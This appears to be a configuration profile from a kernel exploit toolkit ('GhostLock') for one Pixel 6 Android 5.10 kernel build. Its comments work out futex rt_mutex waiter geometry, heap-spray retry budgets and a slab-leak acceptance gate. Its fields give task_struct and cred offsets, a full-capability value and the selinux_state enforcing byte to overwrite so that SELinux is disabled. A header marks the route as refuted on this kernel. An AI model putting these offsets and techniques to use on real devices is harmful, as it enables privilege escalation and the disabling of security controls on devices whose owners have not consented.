# UNSUPPORTED (2026-10-21): W1 refuted on this kernel — the dangling
# pi_blocked_on is already gone when the craft can be planted, so no write is
# reachable from this primitive. Removed from index.conf on purpose; the file
# is kept for forensics only. See build/W1-P6-CLOSEOUT-2026-10-21.md.
# GhostLock kernel profile: 5.10.157-android13-4-00001-g5c7ff5dc7aac-ab10381520 (HOCON, self-contained).
# Pixel 6 (oriole), Tensor G1. Derived 2026-10-17 from the factory image
# (TQ3A.230805.001) by tools/extract_rs on-device: kallsyms 144109 symbols,
# waiter layout identical to marble (tree_entry=0x0 pi_tree_entry=0x18 task=0x30
# lock=0x38 size=0x50), cred.copy_size=168.
# Route: select_stack is GEOMETRICALLY INFEASIBLE on this kernel (do_futex frame
# 0x130 vs marble 0x70 pushes the futex waiter 0xc0 qwords BELOW the pselect
# fd_set: delta=-192), so the upstream-native multicast_waiter route is used.
# Geometry re-derived from THIS image (p6_depth, 2026-10-20):
#   futex waiter depth = __arm64_sys_futex 0x90 + do_futex 0x130
#                        + (futex_wait_requeue_pi 0x1a0 - rt_waiter@+0x90) = 0x2d0
#   setsockopt copy    = __arm64_sys_setsockopt 0x10 + __sys_setsockopt 0x80
#                        + sock_common_setsockopt 0x40 + udp_setsockopt 0x10
#                        + (ip_setsockopt 0x290 - copy dst@+0x18)      = 0x358
# The AF_INET datagram .setsockopt is udp_setsockopt (frame 0x10); it forwards
# IPPROTO_IP straight to ip_setsockopt, so udp_lib_setsockopt's 0x50 frame is
# NOT on this path (an earlier 0x398 derivation counted it and was wrong).
# => waiter_off = 0x358 - 0x2d0 = 0x88 = 136, which also covers prio (0x40) and
# deadline (0x48): 136+0x48+8 = 216 <= 264.
# MEASURED (2026-10-20, device 22251FDF60004E): with waiter_off=136 every walk
# still faulted at rt_mutex_adjust_prio_chain+0x180 on the value 140 (0x8c),
# which is exactly the FAKE_WAITER_PRIO word this encoder writes at craft+0xc8.
# Reading that as "the walk dereferenced waiter->lock (rt_waiter+0x38) out of
# craft+0xc8" gives rt_waiter at craft+0x90, i.e. waiter_off = 144. That reading
# was never confirmed independently: it assumed the faulting access was
# waiter->lock, and the 2026-10-21 frame-shift work showed the same fault is
# explained by the userspace call-depth delta between the futex and setsockopt
# syscalls. The field stays at 136; the extractor still derives 0x88 = 136 from
# prologue arithmetic while printing `futex_wait_requeue_pi add x27, sp, #0x90`
# in the same run, so +0x88 vs +0x90 is an open note, not a settled fact.
# Both candidates fit the 264-byte buffer: 136+0x48+8 = 192, 144+0x48+8 = 216.
# kernel_phys_load stays null: ro.soc.manufacturer=Google => the runtime derives
# Tensor DRAM base 0x80000000 (KIMAGE_TEXT_BASE - MTK_VADDR_BASE).
release = "5.10.157-android13-4-00001-g5c7ff5dc7aac-ab10381520"
schema_version = 1
kernel_major = 5
recommend_shizuku = 0
kernel_phys_load = 2147483648
kernel_phys_offset = null
# The W1 entry clones the leaked page into the waiter craft and the value it
# lands on selinux_state must leave `initialized` (byte 2) non-zero. page_base
# is 32 KiB aligned, so byte 2 of page_base + RELINK_NODE_OFF is byte 2 of the
# slab page; which slab the KernelSnitch leak returns is stochastic (observed
# bases ffffff800bfa0000 / 0xffffff8025408000 / 0xffffff8007720000 all have
# bit 16 of the base clear but byte 2 non-zero). The accept gate is therefore
# "byte 2 != 0" and the spray keeps the shared 4-attempt default budget raised
# to 20 so a page that fails byte 2 can be replaced.
execution {
  heap {
    prepare_max_attempts = 20
  }
}
route {
  multicast_waiter {
      waiter_off = 136
    buffer_size = 264
    task_offset = 48
    lock_offset = 56
    # 2 = the 5.10 compact rt_mutex_waiter (prio at 0x40, no wake_state, no
    # ww_ctx). NOTE: until 2026-10-26 the extractor emitted 1 for every 5.x
    # image; 1 is the 6.1 shape and puts the ghost waiter's prio into the
    # padding half of 0x40, so the payload's `prio > 120` erase gate never
    # opens and the write silently does not happen (on-device symptom:
    # `Write 1 failed` with SELinux still enforcing). The generator now picks
    # the ordinal from the release (`derive::multicast_compact_kind`: 5.10 -> 2,
    # other 5.x -> 1). 2 is what this image needs and what the tool emits.
    compact_waiter = 2
  }
}
fallback {
  to = "none"
}
kernelsnitch {
  collisions = 8
  mm_struct_sz = 1024
}
task_struct {
  prio = 132
  normal_prio = 140
  sched_task_group = 784
  pi_lock = 2156
  pi_waiters = 2176
  pi_top_task = 2192
  pi_blocked_on = 2200
  pid = 1480
  tgid = 1484
  atomic_flags = 1424
  real_cred = 1912
  cred = 1920
  comm = 1936
  tasks = 1224
  seccomp = 2120
}
cred {
  copy_size = 168
  usage_offset = null
  usage_value = 256
  caps_offset = 48
  caps_count = 3
  caps_value = 2199023255551
  ref_count = 3
  ref0_offset = 128
  ref1_offset = 136
  ref2_offset = 144
  ref3_offset = null
  ref0_image = -274694209056
  ref1_image = -274692631352
  ref2_image = -274694209064
  ref3_image = null
}
offset {
  init_task = 50507968
  init_cred = 50330496
  empty_zero_page = 51634176
  root_task_group = 51653184
  # selinux_state + 0 (0x3195970). BTF (pulled from the running kernel,
  # /sys/kernel/btf/vmlinux) proves the layout: `struct selinux_state { bool
  # enforcing; /* +0 */ bool checkreqprot; bool initialized; ... }` -- this
  # 5.10.157 keeps enforcing as the FIRST byte (5.15 moved it behind
  # `disabling`, which is where the earlier +1 came from). Writing +1 hit
  # checkreqprot: a harmless byte that left SELinux enforcing and produced
  # `Write 1 failed` with route status=0 (the on-device symptom).
  selinux_enforcing = 51992944  # selinux_state(0x3195970)+0 byte: the enforcing flag (BTF-verified)
  # .data/.bss pair, corrected 2026-10-26: the previous values (38911168 /
  # 38902032, i.e. both 0x2180 lower) belong to the AOSP build of this same
  # release tag ...-00003-g776d0a76f6aa-ab10208116, not to the signed factory
  # build ...-00001-g5c7ff5dc7aac-ab10381520 this device runs. Re-extracting
  # the factory boot.img reproduces these two exactly.
  selinux_blob_sizes = 38919744
  security_hook_heads = 38910608
  slide_nfulnl_logger = 49352384
  slide_loggers_0_1 = 49352184
  slide_boot_id = 52083241
}
